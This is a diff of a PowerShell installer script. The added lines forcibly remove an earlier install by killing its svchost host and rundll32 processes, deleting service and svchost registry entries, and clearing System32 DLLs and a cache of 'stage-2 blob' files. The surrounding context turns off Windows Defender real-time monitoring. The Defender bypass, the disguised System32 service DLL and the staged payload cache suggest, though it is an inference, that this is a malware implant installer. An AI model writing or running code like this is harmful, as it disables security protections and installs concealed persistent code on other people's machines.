@@ -32,15 +32,64 @@ Write-Host "[1/6] Preparing..." -ForegroundColor Cyan
 try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
 Start-Sleep -Seconds 2
 
-# 2. Remove old installation (WPnpSvc or legacy injector)
+# 2. Remove old installation (robust: force-kill svchost if service hangs on stop)
 Write-Host "[2/6] Removing old installation..." -ForegroundColor Cyan
-sc.exe stop $SVC 2>$null | Out-Null
-Start-Sleep -Seconds 2
-sc.exe delete $SVC 2>$null | Out-Null
-Stop-Process -Name "rundll32" -Force -ErrorAction SilentlyContinue
+
+# Find hosting svchost PID (if service exists)
+function Get-ServicePid([string]$name) {
+    $line = sc.exe queryex $name 2>$null | Select-String '^\s*PID\s*:\s*(\d+)'
+    if ($line -and $line.Matches[0].Groups[1].Value) {
+        return [int]$line.Matches[0].Groups[1].Value
+    }
+    return 0
+}
+
+sc.exe query $SVC 2>$null | Out-Null
+if ($LASTEXITCODE -eq 0) {
+    $svcPid = Get-ServicePid $SVC
+    sc.exe stop $SVC 2>$null | Out-Null
+    # Poll up to 5s for clean stop; force-kill if not stopping.
+    $stopped = $false
+    for ($i = 0; $i -lt 10; $i++) {
+        Start-Sleep -Milliseconds 500
+        $q = sc.exe query $SVC 2>$null | Out-String
+        if ($q -match 'STATE\s*:\s*1\s+STOPPED') { $stopped = $true; break }
+        if ($LASTEXITCODE -ne 0) { $stopped = $true; break }
+    }
+    if (-not $stopped -and $svcPid -gt 0) {
+        Write-Host "       old service hung — taskkill /F /PID $svcPid" -ForegroundColor Yellow
+        taskkill.exe /F /PID $svcPid 2>$null | Out-Null
+        Start-Sleep -Seconds 2
+    }
+    # Remove svchost group entry BEFORE sc delete so SCM can't re-trigger
+    $svchostKey0 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
+    Remove-ItemProperty -Path $svchostKey0 -Name $SVCGROUP -Force -ErrorAction SilentlyContinue
+    sc.exe delete $SVC 2>$null | Out-Null
+    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC" -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# Kill only rundll32 processes that have our DLL loaded (not every rundll32)
+Get-Process -Name "rundll32" -ErrorAction SilentlyContinue | ForEach-Object {
+    try {
+        if ($_.Modules | Where-Object { $_.ModuleName -ieq "pnpext.dll" }) {
+            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+
+# Delete old DLL if it was left behind (new one will be copied in step 3)
+Remove-Item "$SYS32\pnpext.dll" -Force -ErrorAction SilentlyContinue
+Remove-Item "$SYS32\pnpext.dll.old" -Force -ErrorAction SilentlyContinue
+Remove-Item "$SYS32\pnpext.dll.new" -Force -ErrorAction SilentlyContinue
+
 # Remove legacy WPnpSvc.exe if present
 Remove-Item "$SYS32\WPnpSvc.exe" -Force -ErrorAction SilentlyContinue
 Remove-Item "$SYS32\spoolcfg.exe" -Force -ErrorAction SilentlyContinue
+
+# Clean stage-2 blob cache so new install starts from scratch
+if (Test-Path "$env:TEMP\pnp_cache") {
+    Remove-Item "$env:TEMP\pnp_cache\*.bin" -Force -ErrorAction SilentlyContinue
+}
 
 # 3. Copy files
 Write-Host "[3/6] Copying files..." -ForegroundColor Cyan
